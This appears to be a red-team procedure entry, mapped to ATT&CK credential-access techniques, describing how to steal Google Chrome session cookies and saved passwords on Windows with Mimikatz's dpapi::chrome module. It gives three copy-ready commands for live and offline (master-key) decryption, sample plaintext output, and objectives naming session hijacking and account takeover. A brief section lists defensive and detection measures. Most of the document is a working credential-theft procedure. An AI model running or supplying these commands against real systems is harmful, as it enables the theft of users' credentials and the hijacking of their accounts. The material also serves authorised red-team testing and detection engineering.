---
type: procedure
verified: true
submitted: false
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
tactics:
  - '[[tactics/Credential Access|TA0006 - Credential Access]]'
techniques:
  - '[[techniques/Credential Dumping|T1003 - Credential Dumping]]'
  - >-
    [[techniques/Credentials from Password Stores|T1555 - Credentials from
    Password Stores]]
sub_techniques:
  - >-
    [[sub-techniques/Windows Credential Manager|T1555.004 - Windows Credential
    Manager]]
tags:
  - chrome-cookies
  - chrome-credentials
  - mimikatz
  - dpapi
  - credential-access
  - windows
commands:
  - '[[commands/mimikatz-decrypt-chrome-cookies-unprotect]]'
  - '[[commands/mimikatz-decrypt-chrome-cookies-with-masterkey]]'
  - '[[commands/mimikatz-decrypt-chrome-credentials-unprotect]]'
platforms:
  - Windows
tools:
  - '[[tools/Mimikatz]]'
validated: true
---

# Steal-Chrome-Cookies-and-Credentials-with-Mimikatz

## Summary

This procedure uses Mimikatz to extract and decrypt Chrome browser cookies and saved login credentials stored in the user's profile on a Windows system. It leverages the DPAPI to decrypt the encrypted data in Chrome's SQLite databases, allowing attackers to obtain session cookies and plaintext credentials for further lateral movement or impersonation.

## Description

Chrome stores cookies and login credentials in encrypted SQLite files within the user's AppData directory, protected by Windows DPAPI using the user's login credentials. With administrative access, Mimikatz can invoke the dpapi::chrome module to decrypt these without needing the master key for online systems (via /unprotect). For offline decryption (e.g., copied files), a master key extracted from the user's DPAPI blob is required. This technique targets the Default profile but can be adapted for others. It is commonly used post-compromise to harvest browser data for phishing or account takeover. The target environment is a Windows workstation with Google Chrome installed, assuming the victim has logged in to web services.

## Requirements

1. Administrative privileges on the target Windows machine to execute Mimikatz and access DPAPI-protected data.
2. Mimikatz tool installed or available on the system.
3. Google Chrome browser installed with saved cookies and/or credentials in the Default profile.
4. For offline decryption, the Chrome Cookies or Login Data file copied to the attacker's system, plus the user's master key (extractable via other Mimikatz modules like dpapi::masterkey).

## Defense

Defensive measures and detection strategies:

- Enable Credential Guard and LSA Protection to prevent DPAPI decryption by untrusted processes.
- Monitor for suspicious processes like mimikatz.exe or unusual PowerShell/cmd executions accessing AppData\Google\Chrome.
- Use application whitelisting to block unsigned tools like Mimikatz.
- Implement browser policies to disable saving credentials and enable cleartext logging only on protected systems.
- Detect via Sysmon events for file access to Chrome databases or network indicators of stolen credential use.

## Objectives

1. Extract and decrypt Chrome cookies to obtain active session data.
2. Extract and decrypt saved Chrome login credentials for username/password pairs.
3. Use the obtained data for further attacks, such as session hijacking or authentication to other services.

## Instructions

### Step 1: Decrypt Chrome Cookies Using Current User Context

**Context**: On a live system with admin access, use the /unprotect option to decrypt the Cookies database directly using the current user's DPAPI keys. This reveals session cookies for websites like Google, Facebook, etc., without needing additional keys.

**Command** ([[commands/mimikatz-decrypt-chrome-cookies-unprotect]]):

```cmd
mimikatz.exe "dpapi::chrome /in:\"%localappdata%\Google\Chrome\User Data\Default\Cookies\" /unprotect" "exit"
```

> This command launches Mimikatz non-interactively and outputs decrypted cookie entries. If Chrome is running, close it first to avoid database locks. Success is indicated by plaintext cookie values being displayed.

### Step 2: Decrypt Chrome Cookies Using Master Key (Optional, for Offline)

**Context**: If the Cookies file has been exfiltrated or you're operating offline, provide a previously extracted master key from the user's DPAPI storage (e.g., via dpapi::masterkey /in:"%appdata%\Microsoft\Protect"). This step allows decryption without the live user context.

**Command** ([[commands/mimikatz-decrypt-chrome-cookies-with-masterkey]]):

```cmd
mimikatz.exe "dpapi::chrome /in:\"C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data\Default\Cookies\" /masterkey:$_MASTERKEY" "exit"
```

> Replace $_MASTERKEY with the hex master key value. This outputs the same decrypted cookies as Step 1 but works on copied files. If the key is invalid, Mimikatz will error with decryption failure.

### Step 3: Decrypt Chrome Saved Credentials

**Context**: Decrypt the Login Data database to retrieve saved usernames and passwords for websites. Like cookies, /unprotect uses live DPAPI; this reveals plaintext credentials for services the user has autofilled.

**Command** ([[commands/mimikatz-decrypt-chrome-credentials-unprotect]]):

```cmd
mimikatz.exe "dpapi::chrome /in:\"%localappdata%\Google\Chrome\User Data\Default\Login Data\" /unprotect" "exit"
```

> Close Chrome before running to unlock the database. Output includes origin URL, username, and decrypted password. Verify by checking for non-empty password fields.

## Expected Output

Successful execution produces console output from Mimikatz showing decrypted entries in a tabular or key-value format. For cookies:

```
Host: .example.com
Name: SESSIONID
Value: abc123def456...
Path: /
Secure: Yes
HttpOnly: Yes
...
```

For credentials:

```
Origin: https://example.com
Username: user@example.com
Password: plaintextpassword123
...
```

Failure indicators include "ERROR kuhl_m_dpapi_chrome ; Access denied" or empty results, often due to insufficient privileges or locked files.
